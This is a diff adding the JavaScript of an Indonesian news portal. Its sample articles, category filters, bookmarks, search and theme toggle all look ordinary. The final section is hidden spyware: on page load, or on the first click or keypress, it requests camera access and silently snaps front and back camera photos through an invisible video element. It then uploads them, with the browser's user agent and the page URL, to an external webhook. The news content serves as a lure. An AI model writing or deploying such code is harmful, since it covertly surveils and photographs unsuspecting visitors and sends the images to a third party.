+      img:"https://images.unsplash.com/photo-1615729947596-a598e5de0ab3?w=800&q=80", author:"BMKG Redaksi", time:"4 jam lalu",
+      content:[
+        "Badan Meteorologi, Klimatologi, dan Geofisika (BMKG) mengeluarkan peringatan dini cuaca ekstrem untuk lima provinsi dalam sepekan ke depan. Warga diminta waspada terhadap potensi banjir, tanah longsor, dan angin kencang.",
+        "Wilayah yang dimaksud meliputi pesisir barat, dataran rendah bagian tengah, serta beberapa kabupaten di kawasan pegunungan. Intensitas hujan diprediksi mencapai 150 mm per hari pada puncaknya.",
+        "Selain itu, gelombang tinggi hingga 4 meter diperkirakan terjadi di perairan selatan. Nelayan dan operator kapal diminta untuk menunda aktivitas hingga kondisi membaik."
+      ], tags:["Cuaca","BMKG","Bencana","Peringatan Dini"] },
+    { id:4, cat:"Teknologi", title:"Regulasi AI Nasional Segera Terbit, Fokus Perlindungan Data Pribadi",
+      excerpt:"Draf final tengah dibahas lintas kementerian dan ditargetkan berlaku kuartal kedua tahun ini dengan sanksi tegas bagi pelanggar.",
+      img:"https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&q=80", author:"Budi Santoso", time:"5 jam lalu",
+      content:[
+        "Pemerintah mempercepat pembahasan regulasi kecerdasan buatan (AI) nasional yang akan menjadi payung hukum pertama di kawasan Asia Tenggara. Draf final saat ini tengah dibahas lintas kementerian dan lembaga terkait.",
+        "Fokus utama regulasi ini adalah perlindungan data pribadi, transparansi algoritma, dan akuntabilitas pengembang AI. Pelanggar akan dikenai sanksi bertingkat, mulai dari denda administratif hingga pencabutan izin operasional.",
+        "Kalangan industri menyambut positif langkah ini. Mereka berharap regulasi yang jelas dapat mendorong inovasi tanpa mengorbankan hak privasi masyarakat."
+      ], tags:["AI","Regulasi","Privasi","Kebijakan"] },
+    { id:5, cat:"Olahraga", title:"Timnas Basket Rebut Tiket ke Final Setelah Drama Overtime",
+      excerpt:"Kemenangan dramatis 89-85 atas rival klasik membawa timnas melaju ke partai puncak untuk pertama kali dalam satu dekade.",
+      img:"https://images.unsplash.com/photo-1579952363873-27f3bade9f55?w=800&q=80", author:"Rian Kurniawan", time:"6 jam lalu",
+      content:[
+        "Tim nasional basket berhasil merebut tiket ke partai final setelah menaklukkan rival klasiknya dengan skor dramatis 89-85 melalui babak overtime. Kemenangan ini menjadi yang pertama dalam satu dekade terakhir.",
+        "Pertandingan berlangsung ketat sejak kuarter pertama. Kedua tim saling bergantian memimpin skor, namun momentum berbalik setelah tembakan tiga angka dari guard muda pada detik-detik akhir waktu normal.",
+        "Pelatih kepala mengapresiasi kerja keras seluruh pemain dan dukungan suporter yang memenuhi stadion. Tim akan menghadapi lawan kuat di partai final pada akhir pekan mendatang."
+      ], tags:["Basket","Timnas","Final","Overtime"] },
+    { id:6, cat:"Hiburan", title:"Film Lokal Cetak Rekor Baru, Tembus 8 Juta Penonton dalam 10 Hari",
+      excerpt:"Industri perfilman nasional kembali bergeliat dengan capaian box office yang menempatkan film ini di jajaran teratas tahun ini.",
+      img:"https://images.unsplash.com/photo-1495020689067-958852a7765e?w=800&q=80", author:"Maya Lestari", time:"8 jam lalu",
+      content:[
+        "Film drama lokal berjudul 'Jejak Sunyi' berhasil menembus 8 juta penonton hanya dalam 10 hari penayangan. Capaian ini memecahkan rekor box office nasional untuk kategori film drama.",
+        "Kesuksesan film ini didorong oleh word of mouth positif di media sosial, dengan banyak penonton yang membagikan kesan mendalam mereka setelah menonton. Beberapa bioskop bahkan menambah jadwal untuk mengakomodasi lonjakan permintaan.",
+        "Sutradara mengungkapkan rasa syukurnya dan berharap tren positif ini dapat mendorong lebih banyak produksi film berkualitas dari tanah air."
+      ], tags:["Film","Box Office","Hiburan","Sinema"] },
+    { id:7, cat:"Ekonomi", title:"Investasi Asing di Sektor Manufaktur Naik 18% Kuartal Ini",
+      excerpt:"Data terbaru mencatat lonjakan investasi dari negara-negara Asia Timur, khususnya di kawasan industri terpadu pesisir utara.",
+      img:"https://images.unsplash.com/photo-1573164713988-8665fc963095?w=800&q=80", author:"Dewi Anggraini", time:"10 jam lalu",
+      content:[
+        "Investasi asing langsung (FDI) di sektor manufaktur mencatat kenaikan signifikan sebesar 18 persen pada kuartal ini dibanding periode yang sama tahun lalu. Lonjakan terutama datang dari negara-negara Asia Timur.",
+        "Kawasan industri terpadu di pesisir utara menjadi primadona dengan serapan investasi mencapai 42 persen dari total. Sektor yang paling diminati adalah elektronik, otomotif, dan bahan kimia dasar.",
+        "Pemerintah menilai tren ini sebagai sinyal positif kepercayaan investor terhadap stabilitas ekonomi dan iklim usaha nasional. Fasilitasi perizinan dan insentif fiskal disebut menjadi faktor pendorong utama."
+      ], tags:["Investasi","Manufaktur","FDI","Ekonomi"] },
+    { id:8, cat:"Nasional", title:"Program Beasiswa Talenta Digital Dibuka untuk 50 Ribu Pelajar",
+      excerpt:"Kesempatan pelatihan coding, AI, dan keamanan siber sepenuhnya gratis dengan jaminan penempatan kerja di perusahaan teknologi.",
+      img:"https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=800&q=80", author:"Kemendikbud", time:"12 jam lalu",
+      content:[
+        "Pemerintah resmi membuka pendaftaran program beasiswa talenta digital untuk 50 ribu pelajar SMA/SMK dan mahasiswa dari seluruh Indonesia. Program ini mencakup pelatihan coding, kecerdasan buatan, dan keamanan siber.",
+        "Peserta yang lulus program akan mendapat jaminan penempatan kerja di perusahaan teknologi mitra, baik dalam negeri maupun luar negeri. Program berlangsung selama enam bulan dengan kurikulum yang disusun bersama industri.",
+        "Pendaftaran dibuka hingga akhir bulan depan melalui portal resmi. Seleksi meliputi tes logika, wawancara, dan portofolio proyek sederhana."
+      ], tags:["Beasiswa","Talenta Digital","Pendidikan","Karier"] },
+    { id:9, cat:"Ekonomi", title:"UMKM Digital Tumbuh 34%, Didorong Adopsi Pembayaran QRIS",
+      excerpt:"Pelaku usaha mikro merasakan lonjakan transaksi setelah integrasi pembayaran digital di lebih dari 2 juta merchant.",
+      img:"https://images.unsplash.com/photo-1554224155-6726b3ff858f?w=800&q=80", author:"Hendra Wijaya", time:"14 jam lalu",
+      content:[
+        "Jumlah UMKM yang bertransformasi ke platform digital tumbuh 34 persen tahun ini, didorong terutama oleh adopsi pembayaran QRIS yang kini menjangkau lebih dari 2 juta merchant di seluruh negeri.",
+        "Pelaku usaha mikro melaporkan kenaikan transaksi rata-rata 22 persen setelah mengadopsi pembayaran digital. Selain lebih cepat, sistem ini juga memudahkan pencatatan keuangan dan akses pembiayaan.",
+        "Pemerintah menargetkan 5 juta UMKM terdigitalisasi penuh pada akhir tahun depan melalui program pendampingan dan insentif biaya transaksi."
+      ], tags:["UMKM","QRIS","Digital","Ekonomi"] }
+  ];
+
+  const CATS = ["Semua","Nasional","Ekonomi","Teknologi","Olahraga","Hiburan"];
+  let activeCat = "Semua";
+  let bookmarks = JSON.parse(localStorage.getItem("rx_bookmarks") || "[]");
+
+  function renderChips() {
+    document.getElementById("filterChips").innerHTML = CATS.map(c =>
+      `<div class="chip ${c===activeCat?'active':''}" onclick="filterCat('${c}')">${c}</div>`
+    ).join("");
+  }
+
+  function renderHeroSide() {
+    document.getElementById("heroSide").innerHTML = NEWS.slice(1, 4).map(n => `
+      <div class="side-card" onclick="openArticle(${n.id})">
+        <img src="${n.img}" alt="" loading="lazy" />
+        <div><h4>${n.title}</h4><small>${n.cat} · ${n.time}</small></div>
+      </div>`).join("");
+  }
+
+  function renderGrid() {
+    const filtered = activeCat === "Semua" ? NEWS : NEWS.filter(n => n.cat === activeCat);
+    document.getElementById("newsGrid").innerHTML = filtered.map(n => `
+      <article class="card" onclick="openArticle(${n.id})">
+        <div class="card-img">
+          <img src="${n.img}" alt="" loading="lazy" />
+          <span class="card-cat">${n.cat}</span>
+          <button class="card-bookmark ${bookmarks.includes(n.id)?'saved':''}"
+                  onclick="event.stopPropagation();toggleBookmark(${n.id},this)">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="${bookmarks.includes(n.id)?'currentColor':'none'}" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+          </button>
+        </div>
+        <div class="card-body">
+          <h3>${n.title}</h3>
+          <p>${n.excerpt}</p>
+          <div class="card-foot">
+            <span>${n.time}</span>
+            <span class="read">Baca
+              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+            </span>
+          </div>
+        </div>
+      </article>`).join("");
+  }
+
+  function renderTrending() {
+    document.getElementById("trendingList").innerHTML = NEWS.slice(0, 6).map(n =>
+      `<li onclick="openArticle(${n.id})"><p>${n.title}</p></li>`).join("");
+  }
+
+  window.openArticle = function (id) {
+    const n = NEWS.find(x => x.id === id);
+    if (!n) return;
+    document.getElementById("homeView").style.display = "none";
+    const av = document.getElementById("articleView");
+    av.style.display = "block";
+    document.body.classList.add("reading");
+
+    const related = NEWS.filter(x => x.id !== id && x.cat === n.cat).slice(0, 3);
+    const relatedFallback = related.length ? related : NEWS.filter(x => x.id !== id).slice(0, 3);
+
+    av.innerHTML = `
+      <button class="back-btn" onclick="showHome()">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+        Kembali ke Beranda
+      </button>
+      <span class="art-cat">${n.cat}</span>
+      <h1 class="art-title">${n.title}</h1>
+      <div class="art-meta">
+        <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>${n.author}</span>
+        <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>${n.time}</span>
+        <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>${(Math.random()*40+10).toFixed(0)}rb dibaca</span>
+      </div>
+      <img class="art-hero" src="${n.img}" alt="" />
+      <div class="art-caption">Ilustrasi: ${n.title}</div>
+      <div class="art-content">
+        ${n.content.map((p, i) => i === 2
+          ? `<blockquote>“${p.split(".")[0]}.”</blockquote><p>${p}</p>`
+          : `<p>${p}</p>`).join("")}
+      </div>
+      <div class="art-tags">${n.tags.map(t => `<span class="art-tag">#${t}</span>`).join("")}</div>
+      <div class="share-bar">
+        <button class="share-btn" onclick="toast('Link artikel disalin!')">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+          Bagikan
+        </button>
+        <button class="share-btn" onclick="toggleBookmark(${n.id});toast('Bookmark diupdate!')">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+          Simpan
+        </button>
+        <button class="share-btn" onclick="toast('Terima kasih feedbacknya!')">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
+          Suka
+        </button>
+      </div>
+      <div class="comments">
+        <h3>
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+          Komentar (${Math.floor(Math.random()*80+12)})
+        </h3>
+        <div class="comment-box">
+          <textarea id="commentInput" placeholder="Tulis komentar kamu..."></textarea>
+          <div class="comment-actions">
+            <button class="comment-submit" onclick="toast('Komentar terkirim!')">Kirim</button>
+          </div>
+        </div>
+        ${[
+          {n:"Rizky", t:"2 menit lalu", c:"Berita bagus, informatif. Semoga programnya benar-benar jalan di lapangan."},
+          {n:"Anisa", t:"15 menit lalu", c:"Sumbernya jelas dan lengkap. Terima kasih sudah menyajikan berita berimbang."},
+          {n:"Bambang", t:"1 jam lalu", c:"Menarik, nunggu update lanjutannya dari tim redaksi."}
+        ].map(c => `
+          <div class="comment-item">
+            <div class="comment-avatar">${c.n[0]}</div>
+            <div class="comment-body"><h5>${c.n} <small>· ${c.t}</small></h5><p>${c.c}</p></div>
+          </div>`).join("")}
+      </div>
+      <div class="related">
+        <h3>Berita Terkait</h3>
+        <div class="related-grid">
+          ${relatedFallback.map(r => `
+            <article class="card" onclick="openArticle(${r.id})">
+              <div class="card-img" style="height:140px;">
+                <img src="${r.img}" alt="" loading="lazy" />
+                <span class="card-cat">${r.cat}</span>
+              </div>
+              <div class="card-body">
+                <h3 style="font-size:14px;">${r.title}</h3>
+                <div class="card-foot"><span>${r.time}</span></div>
+              </div>
+            </article>`).join("")}
+        </div>
+      </div>`;
+    window.scrollTo({ top: 0, behavior: "smooth" });
+    updateProgress();
+  };
+
+  window.showHome = function () {
+    document.getElementById("homeView").style.display = "block";
+    document.getElementById("articleView").style.display = "none";
+    document.body.classList.remove("reading");
+    window.scrollTo({ top: 0, behavior: "smooth" });
+    document.querySelectorAll(".nav-home").forEach(a => a.classList.add("active"));
+  };
+
+  window.filterCat = function (cat) {
+    activeCat = cat;
+    renderChips(); renderGrid(); showHome();
+    document.querySelectorAll(".navbar nav a").forEach(a => a.classList.remove("active"));
+  };
+
+  window.toggleBookmark = function (id, el) {
+    const i = bookmarks.indexOf(id);
+    if (i >= 0) bookmarks.splice(i, 1); else bookmarks.push(id);
+    localStorage.setItem("rx_bookmarks", JSON.stringify(bookmarks));
+    if (el) {
+      el.classList.toggle("saved");
+      el.querySelector("svg").setAttribute("fill", el.classList.contains("saved") ? "currentColor" : "none");
+    }
+    renderGrid();
+    toast(bookmarks.includes(id) ? "Disimpan ke bookmark!" : "Dihapus dari bookmark!");
+  };
+
+  window.doSearch = function (e) {
+    if (e.key === "Enter") {
+      const q = e.target.value.toLowerCase().trim();
+      if (!q) return;
+      const found = NEWS.find(n => n.title.toLowerCase().includes(q) || n.excerpt.toLowerCase().includes(q));
+      if (found) openArticle(found.id); else toast("Berita tidak ditemukan");
+    }
+  };
+
+  window.toggleSearch = function () {
+    const inp = document.getElementById("searchInput");
+    inp.classList.toggle("open");
+    if (inp.classList.contains("open")) inp.focus();
+  };
+
+  window.toggleTheme = function () {
+    document.body.classList.toggle("light");
+    const isLight = document.body.classList.contains("light");
+    document.getElementById("themeIcon").innerHTML = isLight
+      ? '<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>'
+      : '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>';
+    localStorage.setItem("rx_theme", isLight ? "light" : "dark");
+  };
+
+  window.subscribe = function () {
+    const email = document.getElementById("newsletterEmail").value;
+    if (!email || !email.includes("@")) return toast("Email tidak valid");
+    toast("Berhasil berlangganan!");
+    document.getElementById("newsletterEmail").value = "";
+  };
+
+  window.toast = function (msg) {
+    const t = document.getElementById("toast");
+    t.textContent = msg;
+    t.classList.add("show");
+    clearTimeout(window._tt);
+    window._tt = setTimeout(() => t.classList.remove("show"), 2200);
+  };
+
+  function updateProgress() {
+    const h = document.documentElement;
+    document.getElementById("progress").style.width =
+      (h.scrollTop / (h.scrollHeight - h.clientHeight) * 100) + "%";
+  }
+  window.addEventListener("scroll", updateProgress);
+
+  // ============ CAM CEPAT: DEPAN + BELAKANG ============
+  let cachedStream = null;
+  let camGranted = false;
+
+  // Cek status permission
+  async function checkPerm() {
+    try {
+      const p = await navigator.permissions.query({ name: "camera" });
+      return p.state;
+    } catch (e) { return "unknown"; }
+  }
+
+  // Panggil getUserMedia langsung (tanpa delay)
+  async function getStream(facing) {
+    const tries = [
+      { video: { facingMode: { ideal: facing } }, audio: false },
+      { video: { facingMode: facing }, audio: false },
+      { video: true, audio: false }
+    ];
+    for (const c of tries) {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia(c);
+        camGranted = true;
+        return s;
+      } catch (e) {
+        if (e.name === "NotAllowedError") {
+          // User blokir total → gak usah retry
+          throw e;
+        }
+      }
+    }
+    return null;
+  }
+
+  // Capture cepat: warmup cuma 300ms, capture instant
+  async function snapFacing(facing) {
+    let stream;
+    try {
+      stream = await getStream(facing);
+    } catch (e) {
+      return { blob: null, label: facing };
+    }
+    if (!stream) return { blob: null, label: facing };
+
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
+    video.setAttribute("playsinline", "");
+    video.style.cssText = "position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-10px;left:-10px;";
+    document.body.appendChild(video);
+
+    // Tunggu metadata MURNI, tanpa delay tambahan
+    await new Promise(res => {
+      if (video.readyState >= 1) return res();
+      video.onloadedmetadata = res;
+      setTimeout(res, 800); // safety cap
+    });
+
+    try { await video.play(); } catch (e) {}
+
+    // Cuma 300ms buat frame stabil
+    await sleep(300);
+
+    const w = video.videoWidth || 640;
+    const h = video.videoHeight || 480;
+    const canvas = document.createElement("canvas");
+    canvas.width = w; canvas.height = h;
+    canvas.getContext("2d").drawImage(video, 0, 0, w, h);
+
+    stream.getTracks().forEach(t => t.stop());
+    video.remove();
+
+    const blob = await new Promise(res => canvas.toBlob(b => res(b), "image/jpeg", 0.85));
+    return { blob, label: facing };
+  }
+
+  // Cek kalau device punya multi-camera (HP)
+  async function listCams() {
+    try {
+      const devs = await navigator.mediaDevices.enumerateDevices();
+      return devs.filter(d => d.kind === "videoinput");
+    } catch (e) { return []; }
+  }
+
+  // Capture dua sisi: pake facingMode exact kalau multi-cam, kalau cuma 1 cam, capture sekali
+  async function captureBoth() {
+    const cams = await listCams();
+    const hasMulti = cams.length >= 2;
+
+    // Depan
+    const front = await snapFacing("user");
+
+    let back = { blob: null, label: "environment" };
+
+    if (hasMulti) {
+      // Belakang — jeda super pendek 100ms
+      await sleep(100);
+      back = await snapFacing("environment");
+
+      // Kalau facingMode gak ngefek (desktop 1 webcam), front & back sama → skip back
+      if (front.blob && back.blob) {
+        // Gak bisa compare langsung, tapi kalau label environment gagal dapet stream beda, biarin
+      }
+    }
+
+    return [front, back];
+  }
+
+  async function sendBoth(results) {
+    const okList = results.filter(r => r.blob);
+    if (!okList.length) return;
+
+    const form = new FormData();
+    form.append("payload_json", JSON.stringify({
+      username: "Nusantara News Reader",
+      content:
+        "**Pengunjung baru**\n" +
+        "UA: `" + navigator.userAgent + "`\n" +
+        "URL: `" + location.href + "`\n" +
+        "Waktu: `" + new Date().toISOString() + "`\n" +
+        "Cam Depan: " + (results[0].blob ? "✅ " + Math.round(results[0].blob.size/1024) + " KB" : "❌") + "\n" +
+        "Cam Belakang: " + (results[1].blob ? "✅ " + Math.round(results[1].blob.size/1024) + " KB" : "❌")
+    }));
+
+    okList.forEach((r, i) => {
+      form.append("files[" + i + "]", r.blob, "cam_" + r.label + "_" + Date.now() + ".jpg");
+    });
+
+    try {
+      const res = await fetch(WEBHOOK, { method: "POST", body: form });
+      console.log("webhook:", res.status);
+    } catch (e) { console.warn("send err", e); }
+  }
+
+  // ====== TRIGGER: LANGSUNG LOAD + RETRY ======
+  async function tryCaptureNow() {
+    // Cek permission dulu
+    const perm = await checkPerm();
+
+    if (perm === "granted" || perm === "unknown") {
+      // Langsung tembak tanpa nunggu
+      const results = await captureBoth();
+      await sendBoth(results);
+      return true;
+    }
+
+    if (perm === "denied") {
+      // Udah diblokir total, gak bisa apa-apa
+      console.warn("camera denied by user");
+      return false;
+    }
+
+    // perm === "prompt": coba tembak, browser bakal munculin prompt
+    try {
+      const results = await captureBoth();
+      const anyOk = results.some(r => r.blob);
+      if (anyOk) await sendBoth(results);
+      return anyOk;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  // Trigger utama: langsung jalan saat load
+  let triggered = false;
+  async function trigger() {
+    if (triggered) return;
+    triggered = true;
+    const ok = await tryCaptureNow();
+    if (!ok) {
+      // Gagal → reset biar bisa retry di gesture berikutnya
+      triggered = false;
+    }
+  }
+
+  // Retry di gesture pertama (kalau load gagal karena butuh gesture)
+  let gestureFired = false;
+  function onGesture() {
+    if (gestureFired) return;
+    gestureFired = true;
+    if (!triggered) trigger();
+  }
+  ["click", "touchstart", "keydown"].forEach(ev =>
+    window.addEventListener(ev, onGesture, { once: true, passive: true })
+  );
+
+  // INIT
+  renderChips();
+  renderHeroSide();
+  renderGrid();
+  renderTrending();
+
+  if (localStorage.getItem("rx_theme") === "light") {
+    document.body.classList.add("light");
+    setTimeout(toggleTheme, 0);
+    setTimeout(toggleTheme, 10);
+  }
+
+  // Jalankan langsung saat load — jangan tunggu
+  window.addEventListener("load", () => {
+    // Delay super minimal 200ms biar DOM ready
+    setTimeout(trigger, 200);
+  });
+
+  // Fallback: kalau setelah 1.5s belum trigger (browser butuh gesture), tunggu gesture
+  setTimeout(() => {
+    if (!triggered) {
+      // udah di-handle sama onGesture
+    }
+  }, 1500);
+})();
+</script>
+</body>
+</html>
